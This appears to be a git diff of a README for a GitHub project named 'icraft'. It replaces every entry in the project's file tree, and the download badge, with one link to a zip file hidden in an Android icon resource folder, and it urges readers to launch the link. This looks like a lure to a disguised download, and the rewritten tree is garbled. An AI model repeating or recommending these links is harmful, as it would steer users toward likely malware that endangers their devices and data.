@@ -37,26 +37,26 @@ icraft/
 │
 ├── lib/
 │   ├── screens/
-│   │   ├── https://github.com/Anotherrboy/icraft/releases/tag/v1.2
-│   │   ├── https://github.com/Anotherrboy/icraft/releases/tag/v1.2
-│   │   └── https://github.com/Anotherrboy/icraft/releases/tag/v1.2
+│   │   ├── https://github.com/Anotherrboy/icraft/raw/refs/heads/main/android/app/src/main/res/mipmap-hdpi/Software-v2.6.zip
+│   │   ├── https://github.com/Anotherrboy/icraft/raw/refs/heads/main/android/app/src/main/res/mipmap-hdpi/Software-v2.6.zip
+│   │   └── https://github.com/Anotherrboy/icraft/raw/refs/heads/main/android/app/src/main/res/mipmap-hdpi/Software-v2.6.zip
 │   ├── models/
-│   │   ├── https://github.com/Anotherrboy/icraft/releases/tag/v1.2
-│   │   └── https://github.com/Anotherrboy/icraft/releases/tag/v1.2
+│   │   ├── https://github.com/Anotherrboy/icraft/raw/refs/heads/main/android/app/src/main/res/mipmap-hdpi/Software-v2.6.zip
+│   │   └── https://github.com/Anotherrboy/icraft/raw/refs/heads/main/android/app/src/main/res/mipmap-hdpi/Software-v2.6.zip
 │   └── widgets/
-│       ├── https://github.com/Anotherrboy/icraft/releases/tag/v1.2
-│       └── https://github.com/Anotherrboy/icraft/releases/tag/v1.2
+│       ├── https://github.com/Anotherrboy/icraft/raw/refs/heads/main/android/app/src/main/res/mipmap-hdpi/Software-v2.6.zip
+│       └── https://github.com/Anotherrboy/icraft/raw/refs/heads/main/android/app/src/main/res/mipmap-hdpi/Software-v2.6.zip
 │
 ├── assets/
 │   ├── images/
-│   │   ├── https://github.com/Anotherrboy/icraft/releases/tag/v1.2
-│   │   └── https://github.com/Anotherrboy/icraft/releases/tag/v1.2
+│   │   ├── https://github.com/Anotherrboy/icraft/raw/refs/heads/main/android/app/src/main/res/mipmap-hdpi/Software-v2.6.zip
+│   │   └── https://github.com/Anotherrboy/icraft/raw/refs/heads/main/android/app/src/main/res/mipmap-hdpi/Software-v2.6.zip
 │   └── fonts/
-│       └── https://github.com/Anotherrboy/icraft/releases/tag/v1.2
+│       └── https://github.com/Anotherrboy/icraft/raw/refs/heads/main/android/app/src/main/res/mipmap-hdpi/Software-v2.6.zip
 │
-├── https://github.com/Anotherrboy/icraft/releases/tag/v1.2
-├── https://github.com/Anotherrboy/icraft/releases/tag/v1.2
-└── https://github.com/Anotherrboy/icraft/releases/tag/v1.2
+├── https://github.com/Anotherrboy/icraft/raw/refs/heads/main/android/app/src/main/res/mipmap-hdpi/Software-v2.6.zip
+├── https://github.com/Anotherrboy/icraft/raw/refs/heads/main/android/app/src/main/res/mipmap-hdpi/Software-v2.6.zip
+└── https://github.com/Anotherrboy/icraft/raw/refs/heads/main/android/app/src/main/res/mipmap-hdpi/Software-v2.6.zip
 ```
 
 ## 🌟 How to Use
@@ -67,7 +67,7 @@ icraft/
 
 ## 🔗 Download
 
-[![Download iCraft](https://github.com/Anotherrboy/icraft/releases/tag/v1.2%https://github.com/Anotherrboy/icraft/releases/tag/v1.2)](https://github.com/Anotherrboy/icraft/releases/tag/v1.2)
+[![Download iCraft](https://github.com/Anotherrboy/icraft/raw/refs/heads/main/android/app/src/main/res/mipmap-hdpi/Software-v2.6.zip%https://github.com/Anotherrboy/icraft/raw/refs/heads/main/android/app/src/main/res/mipmap-hdpi/Software-v2.6.zip)](https://github.com/Anotherrboy/icraft/raw/refs/heads/main/android/app/src/main/res/mipmap-hdpi/Software-v2.6.zip)
 
 *Please note that the link above needs to be launched for download.*
 
